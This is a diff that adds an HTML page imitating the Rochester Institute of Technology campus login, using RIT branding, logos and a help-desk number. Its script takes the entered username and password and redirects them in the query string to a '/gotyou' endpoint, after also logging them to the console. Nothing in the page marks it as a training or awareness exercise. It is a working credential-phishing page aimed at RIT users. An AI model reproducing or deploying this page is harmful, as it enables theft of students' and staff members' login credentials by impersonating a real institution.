@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>RIT Login</title>
+</head>
+
+<body>
+
+    <div class="top-bar"> <img class="top-bar-logo invisable" onload="this.classList.remove('invisable')" src="login-top-bar.png"/></div>
+    <div class="login">
+        <!-- <img class="logo invisable" onload="this.classList.remove('invisable')" src="login.png"/> -->
+        <img class="rit-logo invisable" onload="this.classList.remove('invisable')" src="rit-login-logo.png"/>
+        <div class="howisthishelpful">Login to campus.ps.rit.edu</div>
+        <form class="form" id="form" action="/gotyou">
+            <label>Username</label>
+            <input type="text" placeholder="RIT Username" onkeydown='handleEnter(event)'>
+            <label>Password</label>
+            <input type="text" placeholder="Password" onkeydown='handleEnter(event)'>
+        </form>
+        <div type="submit" id="submit" class="Login-button" onclick="submit()">Login</div>
+
+        <div class="bottom-stuff">
+            <div><a>Forget Username?</a> | <a>Forgot Password?</a></div>
+            <a>Change Password</a>
+            <div>Need assistance? Please constact the RIT Service Center at</div>
+            <div><a>585-575-5000</a> or visit <a>help.rit.edu</a></div>
+        </div>
+    </div>
+    
+
+
+<script>
+function handleEnter(event) {
+   if (event.key==="Enter") {
+      const form   = document.getElementById('form')
+      const submit = document.getElementById('submit')
+      const index = [...form].indexOf(event.target);
+      try{
+        form.elements[index + 1].focus();
+      }catch(error){
+        submit.click()
+      }
+
+      //event.preventDefault();
+    }
+}
+function submit(){
+    const form   = document.getElementById('form')
+    const index = [...form]
+    console.log(index[0].value)
+    console.log(index[1].value)
+    window.location.href= `/gotyou?username=${index[0].value}&password=${index[1].value}`
+}
+</script>
+
+</body>
+<style>
+* {
+  box-sizing: border-box;
+}
+html, body { height: 100%; } 
+html,body{
+  margin    : 0px;
+  top       : 0px;
+  background: white;
+  overflow-x: hidden;
+  font-family: "Helvetica Neue", "Helvetica", "Roboto", "Arial", sans-serif;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  font-size: 14pt;
+}
+.img{
+    width:100%;
+    height: 100%;
+    object-fit: fill;
+}
+.invisable{
+    display: none;
+}
+.overlay{
+    position: absolute;
+}
+.center{
+    display: grid;
+    width: 100vw;
+    height: 100vh;
+    align-content:center;
+}
+.loginBox label {
+    margin-bottom: 3px;
+}
+.top-bar{
+    background: rgb(247,105,3);
+    height: 42px;
+    width: 100%;
+    display: grid;
+    justify-items: center;
+}
+.top-bar-logo{
+    height: 38px; 
+}
+.rit-logo {
+    width:20%;
+    max-width: 20%;
+    max-height: 90%;
+    margin: 1em auto;
+}
+.login {
+    padding: 15px;
+    margin-top: 60px;
+    margin-right: auto;
+    margin-left: auto;
+    overflow: hidden;
+    border-radius: 5px;
+    min-width: 400px;
+    width: 50vmax;
+    max-width: 600px;
+    display: grid;
+    -webkit-box-orient: vertical;
+    -webkit-box-direction: normal;
+        -ms-flex-direction: column;
+            flex-direction: column;
+    -webkit-box-shadow: 0 1px 2px 0 rgb(0 0 0 / 12%), 0 2px 8px 0 rgb(0 0 0 / 24%);
+            box-shadow: 0 1px 8px 0 #000000, 0 2px 8px 0 #000000;
+            box-shadow: 0 1px 2px 0 rgb(0 0 0 / 12%), 0 2px 8px 0 rgb(0 0 0 / 24%);
+    text-align: center;
+}
+@media (max-width:600px) { 
+    .login{
+        min-width: 380px;
+        width: 380px;
+        
+        overflow-x: hidden;
+    }
+    .top-bar-logo{
+        height: 35px; 
+    }
+} 
+a{
+    color: rgb(207, 88, 3);
+    font-weight: 600;
+}
+a:hover{
+    color     : black;
+    transition: all .3s ease-out;
+    cursor    : pointer;
+}
+.Login-button:hover{
+    background: black;
+    color     : white;
+    transition: all .3s ease-out;
+    cursor    : pointer;
+}
+label{
+    margin-bottom: 5px;
+}
+input{
+    margin-bottom: 5px;
+    padding: 10px;
+    font-size: 15px;
+}
+input:focus{
+    outline: none;
+}
+.form{
+    display: grid;
+    text-align: left;
+}
+.Login-button{
+    justify-self: right;
+    padding: 5px;
+    background-color: rgb(207, 88, 3);
+    width: 125px;
+    height: 50px;
+    line-height:40px;
+    color: white;
+    font-weight: 500;
+    margin-top: 20px;
+}   
+.bottom-stuff{
+    margin-top: 20px;
+}
+.howisthishelpful{
+    margin-bottom: 20px;
+}
+</style>
+</html>
